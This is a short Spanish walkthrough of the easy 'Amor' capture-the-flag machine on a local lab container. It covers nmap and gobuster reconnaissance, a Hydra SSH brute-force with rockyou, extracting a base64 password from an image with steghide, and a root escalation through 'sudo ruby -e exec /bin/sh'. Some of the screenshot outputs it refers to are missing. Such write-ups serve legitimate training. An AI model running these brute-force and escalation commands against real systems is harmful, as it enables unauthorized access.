Maquina: Amor 

Autor: Romabri 

Dificultad: Facil

ping 172.17.0.2 -c 1

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2
Vemos que esta abierto el puerto 22 SSH y el puerto 80 HTTP

accedemos a la pagina web
https://172.17.0.2

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio

Gobuster no ha encontrado nada pero en una de las entradas vemos algo interesante:
Tenemos dos usaurios

Hacemos un ataque de fuerza bruta con Hydra
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Ahora accedemos vía SSH
ssh carlota@172.17.0.2

vemos que hay este directorio /home/carlota/Desktop/fotos/vacaciones y en dicho directorio hay una imagen, la descargamos.

Este comando nos permite descargar archivos desde ssh

scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/romabri/Desktop/maquina/

si abrimos la imagen nos encontramos esto:

Este comando nos extrae información oculta en la imagen
steghiede extract -sf imagen.jpg 

Nos pide que pongamos contraseña si no ponemos nada y damos a enter nos ha generado un archivo secret.txt. Dentro del archivo secret.txt encontramos algo cifrado en base 64

Lo desciframos de la siguiente forma: 

echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 --decode

Cuando hacemos esto nos aparece lo siguiente:

Podría ser una contraseña pero para el usuario Juan no funciona vamos a seguir mirando dentro del usuario Carlota

Si escribimos el comando env vemos algo extraño

El texto cita a un tal oscar vamos a probar la contraseña que hemos encontrado dentro de la imagen con este usaurio

ssh oscar@172.17.0.2

Vamos al escritorio de oscar y vemos un achivo con un texto

Si hacemos un sudo -l nos aparece lo siguiente

Ejecutamos el siguiente comando 

sudo /usr/bin/ruby -e 'exec "/bin/sh"'

Whoami
